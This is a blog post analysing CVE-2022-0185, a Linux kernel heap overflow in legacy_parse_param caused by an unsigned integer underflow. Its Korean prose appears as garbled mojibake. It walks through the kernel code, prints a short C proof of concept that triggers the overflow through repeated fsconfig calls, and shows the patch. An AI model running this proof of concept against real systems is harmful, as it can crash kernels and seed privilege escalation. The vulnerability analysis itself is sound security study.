---
title: CVE-2022-0185
published: 2025-08-17 18:15:00 +09:00
description: "Analysis of a Privilege Escalation Vulnerability in Linux Kernel File System Syscalls Discovered by Syzkaller"
tags: ["1-day", "exploit", "Linux Kernel", "Syzkaller"]
image: ./title.png

category: Linux Kernel
draft: false
---

# Intro

TOOR íŒ€ í™œë™ì„ í•˜ë©° ë¶„ì„í•˜ê²Œ ëœ ë¦¬ëˆ…ìŠ¤ì˜ íŒŒì¼ ì‹œìŠ¤í…œì„ ë‹¤ë£¨ëŠ” ì‹œìŠ¤í…œ ì½œê³¼ ê´€ë ¨ëœ ì·¨ì•½ì ì…ë‹ˆë‹¤. 

<p align="center"><img src="/assets/img/toor.png"/></p>

 CVE-2022-0185ëŠ” <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de2">2022ë…„ 1ì›” 18ì¼ ì»¤ë°‹</a>ì´ ì˜¬ë¼ì˜¤ê³  <a href="https://nvd.nist.gov/vuln/detail/cve-2022-0185">2022ë…„ 2ì›” 11ì¼ì— ì·¨ì•½ì  ì •ë³´ê°€ ê³µê°œëœ</a> ë¦¬ëˆ…ìŠ¤ ì»¤ë„ UAF ì·¨ì•½ì  ì…ë‹ˆë‹¤.

ë³¸ ê¸€ì€ ì„ í–‰ ì—°êµ¬ë¥¼ ì§„í–‰í•˜ì‹  ë‹¤ë¥¸ ì—°êµ¬ì›ë¶„ë“¤ì˜ ê¸€ë“¤ì„ ì½ê³  ì œ ë‚˜ë¦„ ë¶„ì„ì„ ì§„í–‰í•˜ë©° ì·¨ì•½ì ì„ ê³µë¶€í•˜ë©° ì´í•´í•˜ê³  ì •ë¦¬í•´ë³¸ ê²°ê³¼ë¡œ ì‘ì„±í•˜ê²Œëœ ê¸€ì…ë‹ˆë‹¤. ë‚˜ë¦„ì˜ ë¶„ì„ì„ í•´ë´¤ì§€ë§Œ ë§ì§€ ì•ŠëŠ” ë¶€ë¶„ì´ ìˆì„ ìˆ˜ ìˆìœ¼ë©°, ë§Œì•½ ì´ë¥¼ ë°œê²¬í•˜ì…¨ì„ ì‹œ í”¼ë“œë°±í•´ì£¼ì‹œë©´ ì ê·¹ ë°˜ì˜í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ì·¨ì•½ì  ë° PoC ë¶„ì„ì— ë§ì€ ë„ì›€ì´ëœ ìë£Œë“¤ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

- <a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">https://www.willsroot.io/2022/01/cve-2022-0185.html</a>

# Vuln

- CVE-ID : <a href="https://nvd.nist.gov/vuln/detail/cve-2022-0185">CVE-2022-0185</a>
- CWE : <a href="http://cwe.mitre.org/data/definitions/191.html">CWE-191</a>, <a href="http://cwe.mitre.org/data/definitions/190.html">CWE-190</a>

# Background

ì´ë²ˆì— ì•Œì•„ë³¼ ì¹œêµ¬ëŠ” <a href="https://github.com/google/syzkaller">syzkaller</a>ê°€ ë°œê²¬í•´ëƒˆì”ë‹ˆë‹¤.
<img src="/assets/img/CVE-2022-0185/boom.png"/>
ì¥í•˜ë‹¤!

ì·¨ì•½ì ì„ ì´í•´í•˜ê¸° ìœ„í•œ ê°„ëµí•œ ë°±ê·¸ë¼ìš´ë“œ ì§€ì‹ì„ ë°°ì›Œë´…ì‹œë‹¤.

## File system context structure (fs_context)

ë¦¬ëˆ…ìŠ¤ ì»¤ë„ v5.1ì—ì„œëŠ” VFS(Virtual File System)ì—ì„œ ë§ˆìš´íŠ¸ ì¤‘ íŒŒì¼ ì‹œìŠ¤í…œ ì •ë³´ë¥¼ ë‹¤ë£° ë•Œ ì‚¬ìš©í•  `fs_context` êµ¬ì¡°ì²´, íŒŒì¼ ì»¨í…ìŠ¤íŠ¸ ê°œë…ì„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9bc61ab18b1d41f26dc06b9e6d3c203e65f83fe6">ì¶”ê°€í•˜ê²Œ ë©ë‹ˆë‹¤.</a> ì‰½ê²Œ ë§í•´ íŒŒì¼ ì‹œìŠ¤í…œì„ ë§ˆìš´íŠ¸ í•  ë•Œì˜ ë©”íƒ€ë°ì´í„°ë¥¼ ë‹¤ë£° êµ¬ì¡°ì²´ë¼ ë³´ë©´ ë˜ì§€ ì•Šì„ê¹Œ ì‹¶ë„¤ìš”. ìŠˆí¼ë¸”ë¡! í•´ë‹¹ êµ¬ì¡°ì²´ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì •ë³´ë“¤ì„ í¬í•¨í•˜ê²Œ ë©ë‹ˆë‹¤.
```c
/*
 * Filesystem context for holding the parameters used in the creation or
 * reconfiguration of a superblock.
 *
 * Superblock creation fills in ->root whereas reconfiguration begins with this
 * already set.
 *
 * See Documentation/filesystems/mounting.txt
 */
struct fs_context {
	struct file_system_type	*fs_type;
	void			*fs_private;	/* The filesystem's context */
	struct dentry		*root;		/* The root and superblock */
	struct user_namespace	*user_ns;	/* The user namespace for this mount */
	struct net		*net_ns;	/* The network namespace for this mount */
	const struct cred	*cred;		/* The mounter's credentials */
	const char		*source;	/* The source name (eg. dev path) */
	const char		*subtype;	/* The subtype to set on the superblock */
	void			*security;	/* Linux S&M options */
	unsigned int		sb_flags;	/* Proposed superblock flags (SB_*) */
	unsigned int		sb_flags_mask;	/* Superblock flags that were changed */
	enum fs_context_purpose	purpose:8;
	bool			need_free:1;	/* Need to call ops->free() */
};
```

í•´ë‹¹ êµ¬ì¡°ì²´ì™€ ê´€ë ¨ëœ ë‚´ìš©ì€ <a href="https://docs.kernel.org/filesystems/mount_api.html#the-filesystem-context">ê³µì‹ ë¬¸ì„œ</a>ë¥¼ ë³´ì‹œëŠ” ê²ƒì„ ì¶”ì²œí•©ë‹ˆë‹¤! ê³µì‹ ë¬¸ì„œì—ì„œë„ ì•Œ ìˆ˜ ìˆë“¯, ìŠˆí¼ë¸”ë¡ì„ ìœ„í•œ êµ¬ì¡°ì²´ì—ìš©.

- íŒŒì¼ ì‹œìŠ¤í…œ íƒ€ì…
- ë„¤ì„ ìŠ¤í˜ì´ìŠ¤
- ì†ŒìŠ¤/ë””ë°”ì´ìŠ¤ ì´ë¦„
- ìŠˆí¼ë¸”ë¡ í”Œë˜ê·¸
- ë³´ì•ˆ ì„¸ë¶€ ì‚¬í•­
- ë§ˆìš´íŠ¸ ì˜µì…˜ì— ë”°ë¼ ì„¤ì •ë˜ëŠ” íŒŒì¼ ì‹œìŠ¤í…œ íŠ¹ì • ë°ì´í„°

ì´ ì¤‘ `fs_type` ë©¤ë²„ì™€ì˜ ì—°ê²° ê³ ë¦¬ì— ëŒ€í•´ì„œ ì¡°ê¸ˆë§Œ ë” ì•Œì•„ë³´ë„ë¡ í•©ì‹œë‹¤! ì´í›„ì— ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°ì‹œí‚¬ í¬ì¸íŠ¸ê°€ ë˜ê±°ë“ ìš©.

<a href="https://elixir.bootlin.com/linux/v5.2/source/include/linux/fs.h#L2180">`file_system_type`</a> êµ¬ì¡°ì²´ëŠ” ì´ë¦„ì—ì„œë„ ì•Œ ìˆ˜ ìˆë“¯, ë§ˆìš´íŠ¸í•  íŒŒì¼ ì‹œìŠ¤í…œì— ëŒ€í•œ ì—¬ëŸ¬ ì •ë³´ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¹. 

```c
struct file_system_type {
	const char *name;
	int fs_flags;
#define FS_REQUIRES_DEV		1 
#define FS_BINARY_MOUNTDATA	2
#define FS_HAS_SUBTYPE		4
#define FS_USERNS_MOUNT		8	/* Can be mounted by userns root */
#define FS_RENAME_DOES_D_MOVE	32768	/* FS will handle d_move() during rename() internally. */
	int (*init_fs_context)(struct fs_context *);
	const struct fs_parameter_description *parameters;
	struct dentry *(*mount) (struct file_system_type *, int,
		       const char *, void *);
	void (*kill_sb) (struct super_block *);
	struct module *owner;
	struct file_system_type * next;
	struct hlist_head fs_supers;

	struct lock_class_key s_lock_key;
	struct lock_class_key s_umount_key;
	struct lock_class_key s_vfs_rename_key;
	struct lock_class_key s_writers_key[SB_FREEZE_LEVELS];

	struct lock_class_key i_lock_key;
	struct lock_class_key i_mutex_key;
	struct lock_class_key i_mutex_dir_key;
};
```

ì´ˆê¸°í™”ë˜ëŠ” ëª¨ìŠµì€ <a href="https://elixir.bootlin.com/linux/v5.2/source/fs/ext4/super.c#L6066">ê°ê°ì˜ íŒŒì¼ ì‹œìŠ¤í…œê³¼ ê´€ë ¨ëœ íŒŒì¼</a>ì—ì„œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¹. `ext4`ë¥¼ ì˜ˆë¡œ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ì´ˆê¸°í™”ë˜ëŠ” ì½”ë“œë¥¼ ë³´ë©´ `init_fs_context` ë©¤ë²„ëŠ” ê±´ë“¤ì§€ë„ ì•ŠëŠ”ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¡œì¸í•´ í•´ë‹¹ ê°’ì€ 0ì´ ë©ë‹ˆë‹¤. ëŒ€ë¶€ë¶„ì˜ íŒŒì¼ ì‹œìŠ¤í…œì€ ì´ë¥¼ ì´ˆê¸°í™”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. (ëŒ€ë¶€ë¶„ ê¹Œì§„ ì•„ë‹Œê°€..?)
```c
static struct file_system_type ext4_fs_type = {
	.owner		= THIS_MODULE,
	.name		= "ext4",
	.mount		= ext4_mount,
	.kill_sb	= kill_block_super,
	.fs_flags	= FS_REQUIRES_DEV,
};
MODULE_ALIAS_FS("ext4");
```

## System calls related to the file system context

ì•ì„œ ì•Œì•„ë³¸ íŒŒì¼ ì‹œìŠ¤í…œ ì»¨í…ìŠ¤íŠ¸(íŒŒì¼ ì‹œìŠ¤í…œ ë§ˆìš´íŠ¸)ì™€ ê´€ë ¨ëœ ì‹œìŠ¤í…œ ì½œì¸ `fsconfig`, `fsopen`, `fsmount` ë“±ì´ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ecdab150fddb42fe6a739335257949220033b782">ì»¤ë„ ë²„ì „ v5.2ì—ì„œ ì¶”ê°€ë©ë‹ˆë‹¤.</a> ì´ë¦„ì—ì„œë„ ì•Œ ìˆ˜ ìˆë“¯, íŒŒì¼ ì‹œìŠ¤í…œ ë§ˆìš´íŠ¸ë¥¼ ìœ„í•œ ì»¨í…ìŠ¤íŠ¸ë¥¼ ë‹¤ë£° ë•Œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì‹œìŠ¤í…œ ì½œë“¤ì…ë‹ˆë‹¤. ì‚¬ìš© ì˜ˆëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. íŒŒì¼ ì‹œìŠ¤í…œ ì»¨í…ìŠ¤íŠ¸ë¥¼ ë§Œë“¤ê³  ë©”íƒ€ ë°ì´í„°ë¥¼ ì¶”ê°€í•˜ëŠ” ëª¨ìŠµì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```c
    fd = fsopen("ext4", FSOPEN_CLOEXEC);
    fsconfig(fd, fsconfig_set_path, "source", "/dev/sda1", AT_FDCWD);
    fsconfig(fd, fsconfig_set_path_empty, "journal_path", "", journal_fd);
    fsconfig(fd, fsconfig_set_fd, "journal_fd", "", journal_fd);
    fsconfig(fd, fsconfig_set_flag, "user_xattr", NULL, 0);
    fsconfig(fd, fsconfig_set_flag, "noacl", NULL, 0);
    fsconfig(fd, fsconfig_set_string, "sb", "1", 0);
    fsconfig(fd, fsconfig_set_string, "errors", "continue", 0);
    fsconfig(fd, fsconfig_set_string, "data", "journal", 0);
    fsconfig(fd, fsconfig_set_string, "context", "unconfined_u:...", 0);
    fsconfig(fd, fsconfig_cmd_create, NULL, NULL, 0);
    mfd = fsmount(fd, FSMOUNT_CLOEXEC, MS_NOEXEC);
```

# RCA

<a href="https://nvd.nist.gov/vuln/detail/cve-2022-0185">CVE-2022-0185</a> Descriptionì„ êµ¬ê²½í•´ë´…ì‹œë‹¤. ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.
<p align="center"><img src="/assets/img/CVE-2022-0185/cve-description.png"></p>

ì•ì„œ ì•Œì•„ë³¸ íŒŒì¼ ì‹œìŠ¤í…œ ì»¨í…ìŠ¤íŠ¸ë¥¼ ë‹¤ë£¨ëŠ” í•¨ìˆ˜ ì¤‘ `legacy_parse_param`ì—ì„œ ê¸¸ì´ ê²€ì¦ì—ì„œ í™ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•œë‹¤ê³  í•˜ëŠ”êµ°ìš”!

`legacy_parse_parm`ì€ ì•ì„œ ì‚´í´ë³¸ `fsconfig` í•¨ìˆ˜ì—ì„œ ë¬¸ìì—´ íŒŒë¼ë¯¸í„° ê°’ì„ íŒŒì‹±í•˜ëŠ” ê³¼ì •ì—ì„œ ì‚¬ìš©ë©ë‹ˆë‹¤. ë˜í•œ ì´ ì˜µì…˜ ë¬¸ìì—´ì€ ëˆ„ì ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë•Œ ì´ ëˆ„ì ëœ ì˜µì…˜ ê¸¸ì´ë¥¼ ê²€ì¦í•˜ëŠ” ê³¼ì •ì—ì„œ `Integer Underflow(Wrap-around)`ê°€ ë°œìƒí•  ìˆ˜ ìˆê³ , ê²°ê³¼ì ìœ¼ë¡œ ì´ë¡œì¸í•´ í™ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•  ìˆ˜ ìˆëŠ” í™˜ê²½ì´ ë©ë‹ˆë‹¤. ì½”ë“œë¥¼ í™•ì¸í•´ë³¼ê¹Œìš”?

```c
/*
 * Add a parameter to a legacy config.  We build up a comma-separated list of
 * options.
 */
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
	struct legacy_fs_context *ctx = fc->fs_private;
	unsigned int size = ctx->data_size;
	size_t len = 0;
...
	if (len > PAGE_SIZE - 2 - size)
		return invalf(fc, "VFS: Legacy: Cumulative options too large");
...
	ctx->legacy_data[size++] = ',';
	len = strlen(param->key);
	memcpy(ctx->legacy_data + size, param->key, len);
	size += len;
	if (param->type == fs_value_is_string) {
		ctx->legacy_data[size++] = '=';
		memcpy(ctx->legacy_data + size, param->string, param->size);
		size += param->size;
	}
	ctx->legacy_data[size] = '\0';
	ctx->data_size = size;
	ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
	return 0;
}
```

ì¤‘ê°„ì— ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œê°€ ìˆëŠ” ëª¨ìŠµì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ëˆ„ì ë˜ê³  ìˆëŠ” ë¬¸ìì—´ ì˜µì…˜ì˜ í¬ê¸°ë¥¼ ê³„ì‚°í•´ì„œ í˜ì´ì§€ ê¸¸ì´ë¥¼ ë„˜ì–´ê°ˆ ìˆ˜ ì—†ê²Œ í•˜ëŠ” ì½”ë“œë¼ê³  ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. `2 + size`ê°€ `PAGE_SIZE`ë¥¼ ë„˜ì–´ê°€ë©´ ìŒìˆ˜ê°€ ë°œìƒí•˜ì—¬ `len`ì´ ë” ì»¤ì§€ëŠ” ìƒí™©ì´ ë°œìƒí•˜ê² ì£ ? í˜¹ì€, `PAGE_SIZE - (2 + size)`ê°€ `len`ë³´ë‹¤ ì‘ì„ ê²½ìš° `len`ì„ ì¶”ê°€í•  ê¸¸ì´ë¥¼ í™•ë³´í•˜ì§€ ëª»í•˜ë‹ˆ ëˆ„ì ëœ ì˜µì…˜ ê¸¸ì´ì— ëŒ€í•œ ê²€ì¦ì´ë¼ê³  ìƒê°í•  ìˆ˜ ìˆê² ì£ ?
```c
	if (len > PAGE_SIZE - 2 - size)
		return invalf(fc, "VFS: Legacy: Cumulative options too large");
```

í•˜ì§€ë§Œ ì´ëŸ° ê°€ì •ì€ ê³„ì‚° ê²°ê³¼ê°€ ìŒìˆ˜ê°€ ë‚˜ì˜¬ ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— ê¹¨ì§€ê²Œë©ë‹ˆë‹¤. ì¦‰, ìš”ë†ˆë“¤ Unsignedë¼ì„œ ìŒìˆ˜ê°€ ë  ìˆ˜ ì—†ì–´ ë¬´ì§€ë§‰ì§€í•˜ê²Œ ì»¤ì§€ê²Œë˜ë²„ë¦½ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ìì—°ìŠ¤ëŸ½ê²Œ í•´ë‹¹ ê²€ì¦ë¬¸ì„ í”¼í•´ê°€ê³  ê²½ê³„ë¥¼ ë„˜ì–´ì„œ ë°ì´í„°ë¥¼ ì“¸ ìˆ˜ ìˆê²Œë©ë‹ˆë‹¤. ê°„ë‹¨í•˜ì£ ?

ì´ëŸ¬í•œ `legacy_parse_param` ë¬¸ìì—´ ì˜µì…˜ì„ ì„¸íŒ…í•˜ëŠ” ê³¼ì •ì—ì„œ íŠ¸ë¦¬ê±° ëœë‹¤ í–ˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ì¶”ê°€ì ìœ¼ë¡œ íŠ¹ì • ì¡°ê±´ì—ì„œë§Œ ì´ í•¨ìˆ˜ë¥¼ íŠ¸ë¦¬ê±° ì‹œí‚¬ ìˆ˜ ìˆëŠ”ë°, ì´ì— ëŒ€í•œ ë°°ê²½ì€ ì•ì„œ ì„¤ëª…ë“œë¦° `file_system_type` êµ¬ì¡°ì²´ì™€ ê´€ë ¨ìˆìŠµë‹ˆë‹¤. ì¦‰, íŒŒì¼ ì‹œìŠ¤í…œ íƒ€ì…ê³¼ í•´ë‹¹ í•¨ìˆ˜ì— ì—°ê´€ì´ ìˆìŠµë‹ˆë‹¤. ì´ì™€ ê´€ë ¨ëœ ì½”ë“œë¥¼ ì‚´í´ë´…ì‹œë‹¤.

`legacy_parse_param`ì€ íŒŒì¼ ì»¨í…ìŠ¤íŠ¸ì™€ ê´€ë ¨ëœ <a href="https://elixir.bootlin.com/linux/v5.2/source/fs/fs_context.c#L688">ops í•¨ìˆ˜ í…Œì´ë¸”</a>ì— ë‹´ê²¨ ìˆìŠµë‹ˆë‹¤. 

```c
const struct fs_context_operations legacy_fs_context_ops = {
	.free			= legacy_fs_context_free,
	.dup			= legacy_fs_context_dup,
	.parse_param		= legacy_parse_param,
	.parse_monolithic	= legacy_parse_monolithic,
	.get_tree		= legacy_get_tree,
	.reconfigure		= legacy_reconfigure,
};
```

ì•ì„œ ì•Œì•„ë³¸ `fs_context`ëŠ” íŒŒì¼ ì‹œìŠ¤í…œì— ë”°ë¼ ì´ í…Œì´ë¸”ì„ ì„¤ì •í•˜ê²Œë” ë˜ì–´ìˆìŠµë‹ˆë‹¤. ìš”ë ‡ê²Œ ë©¤ë²„ë¡œ ê°–ê³ ìˆì£ . ì—¬ê¸°ì„œ í…Œì´ë¸”ì„ ì„¤ì •í•œë‹¤ëŠ” ë§ì€ í…Œì´ë¸”ì„ ê³ ë¥¸ë‹¤ê³  ë§ ì•ˆí•´ë„ ì•„ì‹œ..ê² ì£ ?
```c
struct fs_context {
	const struct fs_context_operations *ops;
	...
};
```

ì–´ë–¤ í…Œì´ë¸”ì´ ì‚¬ìš©ë ì§€ ê²°ì •ë˜ëŠ” ì‹œì ì€ `fs_context` ì¦‰, íŒŒì¼ ì»¨í…ìŠ¤íŠ¸ê°€ í• ë‹¹ë˜ëŠ” ì‹œì ìœ¼ë¡œ ë‹¤ìŒ í•¨ìˆ˜(<a href="https://elixir.bootlin.com/linux/v5.2/source/fs/fs_context.c#L251">`alloc_fs_context`</a>)ì—ì„œ ì„¤ì •ì´ ì§„í–‰ë©ë‹ˆë‹¤! 

```c
/**
 * alloc_fs_context - Create a filesystem context.
 * @fs_type: The filesystem type.
 * @reference: The dentry from which this one derives (or NULL)
 * @sb_flags: Filesystem/superblock flags (SB_*)
 * @sb_flags_mask: Applicable members of @sb_flags
 * @purpose: The purpose that this configuration shall be used for.
 *
 * Open a filesystem and create a mount context.  The mount context is
 * initialised with the supplied flags and, if a submount/automount from
 * another superblock (referred to by @reference) is supplied, may have
 * parameters such as namespaces copied across from that superblock.
 */
static struct fs_context *alloc_fs_context(struct file_system_type *fs_type,
				      struct dentry *reference,
				      unsigned int sb_flags,
				      unsigned int sb_flags_mask,
				      enum fs_context_purpose purpose)
{
	int (*init_fs_context)(struct fs_context *);
	struct fs_context *fc;
	int ret = -ENOMEM;

	fc = kzalloc(sizeof(struct fs_context), GFP_KERNEL);
	if (!fc)
		return ERR_PTR(-ENOMEM);
...
	/* TODO: Make all filesystems support this unconditionally */
	init_fs_context = fc->fs_type->init_fs_context;
	if (!init_fs_context)
		init_fs_context = legacy_init_fs_context;

	ret = init_fs_context(fc);
...
}
```

ì½”ë“œì—ì„œë„ ë³¼ ìˆ˜ ìˆë“¯, `fc->fs_type->init_fs_contex`ê°€ 0ì¼ ê²½ìš°  `init_fs_context` í•¨ìˆ˜ í¬ì¸í„°ëŠ” `legacy_init_fs_context` í•¨ìˆ˜ë¥¼ ê°€ë¦¬í‚¤ê²Œ ë˜ê³ ! ì´ë¥¼ í˜¸ì¶œí•˜ê²Œë˜ì£ ! <a href="https://elixir.bootlin.com/linux/v5.2/source/fs/fs_context.c#L701">í•´ë‹¹ í•¨ìˆ˜</a>ëŠ” ìš”ë ‡ê²Œ ìƒê²¼ìŠµë‹ˆë‹¤.
```c
/*
 * Initialise a legacy context for a filesystem that doesn't support
 * fs_context.
 */
static int legacy_init_fs_context(struct fs_context *fc)
{
	fc->fs_private = kzalloc(sizeof(struct legacy_fs_context), GFP_KERNEL);
	if (!fc->fs_private)
		return -ENOMEM;
	fc->ops = &legacy_fs_context_ops;
	return 0;
}
```

ë ˆê±°ì‹œ íŒŒì¼ ì»¨í…ìŠ¤íŠ¸ë¥¼ í• ë‹¹í•˜ê³  ops í…Œì´ë¸”ë¡œ `legacy_fs_context_ops`ë¥¼ ì„¤ì •í•´ì£¼ê³  ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ë¬¸ìì—´ íŒŒì‹±ì‹œì— `legacy_parse_param`ì´ í˜¸ì¶œë©ë‹ˆë‹¤!

ì•ì„œ ì‚´í´ë³¸ `ext4`ì˜ ê²½ìš°ì—ë„ í•´ë‹¹ ê°’ì„ ì´ˆê¸°í™”í•˜ì§€ ì•Šì•„ì„œ 0ì…ë‹ˆë‹¤! ë”°ë¼ì„œ `ext4` íŒŒì¼ ì‹œìŠ¤í…œì˜ ê²½ìš°ë„ ì·¨ì•½í•œ í•¨ìˆ˜ë¥¼ íŠ¸ë¦¬ê±° ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ë¦¬ê³  ì´ëŸ¬í•œ `alloc_fs_context` í•¨ìˆ˜ëŠ” `fsopen`ì„ í˜¸ì¶œí•  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ìš”ë ‡ê²Œ ë§ì´ì£ .
```c
    fd = fsopen("ext4", FSOPEN_CLOEXEC);
```

ìš”ë ‡ê²Œ íŠ¹ì • íŒŒì¼ ì‹œìŠ¤í…œìœ¼ë¡œ `fsopen`ì„ í†µí•´ ë ˆê±°ì‹œ íŒŒì¼ ì‹œìŠ¤í…œ ì»¨í…ìŠ¤íŠ¸ë¥¼ ë§Œë“¤ê³  ë¬¸ìì—´ ì˜µì…˜ì„ ëˆ„ì ì‹œí‚¤ë‹¤ë³´ë©´ ëˆ„ì  ì˜µì…˜ ê¸¸ì´ ê²€ì¦ ì‹¤íŒ¨ë¡œì¸í•´ì„œ í™ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ê²Œë©ë‹ˆë‹¤.

# PoC

```c
# define _GNU_SOURCE
# include <sys/syscall.h>
# include <stdio.h>
# include <stdlib.h>
# ifndef __NR_fsconfig
# define __NR_fsconfig 431
# endif
# ifndef __NR_fsopen
# define __NR_fsopen 430
# endif
# define FSCONFIG_SET_STRING 1
# define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
# define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)
int main ( void ) {
  char * val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ;
  int fd = 0 ;
  fd = fsopen( "9p" , 0 );
  if (fd < 0 ) {
    puts ( "Opening" );
    exit ( -1 );
  }
  for ( int i = 0 ; i < 5000 ; i++) {
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00" , val, 0 );
  }
  return 0 ;
}
```

PoCë¥¼ ë³´ë©´ ì•Œ ìˆ˜ ìˆë“¯, `9p` íŒŒì¼ ì‹œìŠ¤í…œì— ëŒ€í•œ íŒŒì¼ ì‹œìŠ¤í…œ ì»¨í…ìŠ¤íŠ¸ë¥¼ ë§Œë“¤ê³  ë¬¸ìì—´ ì˜µì…˜ì„ ê³„ì†í•´ì„œ ëˆ„ì ì‹œí‚¤ëŠ” ëª¨ìŠµì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ ì•Œ ìˆ˜ ìˆëŠ” ì ì€ `9p` íŒŒì¼ ì‹œìŠ¤í…œ ì—­ì‹œ ì»¤ë„ ë‚´ë¶€ì ìœ¼ë¡œ ë ˆê±°ì‹œ íŒŒì¼ ì‹œìŠ¤í…œ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” ì ì´ê² ì£ ?

# Video

ì—´ì‹¬íˆ ì°ëŠ”ì¤‘ ğŸ¥ ğŸ˜…

# Patch

íŒ¨ì¹˜ëŠ” ì•„ì£¼ ì—„ì²­ ê°„ë‹¨í•©ë‹ˆë‹¤! ğŸ˜ƒ ì•ì„œ ëº„ì…ˆ ì—°ì‚°ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì—ì„œ ë§ì…ˆ ì—°ì‚°ì„ í†µí•´ í˜„ì¬ ëˆ„ì ë  ì˜µì…˜ ê°’ì´ í˜ì´ì§€ ê¸¸ì´ë¥¼ ë„˜ì–´ê°€ëŠ”ì§€ í™•ì¸í•˜ê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. 

```diff
-	if (len > PAGE_SIZE - 2 - size)
+	if (size + len + 2 > PAGE_SIZE)
 		return invalf(fc, "VFS: Legacy: Cumulative options too large");
 	if (strchr(param->key, ',') ||
 	    (param->type == fs_value_is_string &&
```

ì‹¬í•˜ê²Œ ë”ìš´ ì—¬ë¦„ì´ë„¤ìš”! ë‹¤ë“¤ ë”ìœ„ ì¡°ì‹¬í•˜ì„¸ìš”! ê·¸ëŸ¼ 20000 ğŸ‘‹ğŸ‘‹ğŸ‘‹

# Mitigation

- í•´ë‹¹ ì·¨ì•½ì ì— ëŒ€í•œ ì»¤ë„ ì—…ê·¸ë ˆì´ë“œë¥¼ ì§„í–‰í•˜ì„¸ìš© ^~^

# References

- <a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">https://www.willsroot.io/2022/01/cve-2022-0185.html</a>